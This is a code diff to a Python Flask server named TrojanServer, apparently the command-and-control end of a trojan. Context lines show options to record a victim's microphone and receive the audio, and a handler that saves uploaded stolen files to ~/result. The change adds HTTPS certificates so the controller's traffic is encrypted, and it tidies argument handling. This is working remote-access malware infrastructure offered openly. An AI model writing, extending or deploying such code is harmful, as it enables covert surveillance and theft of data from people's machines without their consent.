@@ -32,6 +32,9 @@ class ParseArgs:
                                  help='record mic sound for X millisecondes and send receive the audio file')
         self.parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', default=False,
                                  help='verbose')
+        self.parser.add_argument('-s', '--ssl', dest='ssl', action='store', metavar=('folder'), nargs=1,
+                                 default=False,
+                                 help='folder with app.crt and app.key for https')
         self.args = self.parser.parse_args()
 
     def getargs(self):
@@ -46,7 +49,7 @@ class TrojanServer():
         self.args = args
         self.ssl = ssl
         self.null = 'null'
-        self.excludeArgs = ['verbose']
+        self.excludeArgs = ['verbose', 'ssl']
         self.nullAction = False
         self.route()
 
@@ -87,8 +90,8 @@ class TrojanServer():
                 except:
                     print(str(request.data))
             elif request.mimetype == "multipart/form-data":
-		fileresult = expanduser("~") + "/result"
-		print(fileresult)
+                fileresult = expanduser("~") + "/result"
+                print(fileresult)
                 request.files['filedata'].save(fileresult)
             else:
                 print(str(request.data))
@@ -108,14 +111,14 @@ class TrojanServer():
         func()
 
 def main():
-    if os.path.isfile('ssl/app.crt') and os.path.isfile('ssl/app.key'):
-	ssl = ('ssl/app.crt', 'ssl/app.key')
+    args = ParseArgs().getargs()
+    if args.ssl[0] and os.path.isfile(args.ssl[0] + '/app.crt') and os.path.isfile(args.ssl[0] + '/app.key'):
+        ssl = (args.ssl[0] + '/app.crt', args.ssl[0] + '/app.key')
     else:
         ssl = False
 
     app = Flask(__name__)
-    server = TrojanServer(app=app, host='192.168.1.36', port=8080, args=ParseArgs().getargs(), ssl=ssl)
-    # server = trojan_server(app=app, host='192.168.1.79', port=8080, args=parse_args().getargs())
+    server = TrojanServer(app=app, host='192.168.1.36', port=8080, args=args, ssl=ssl)
     server.start()
 
 if __name__ == '__main__':
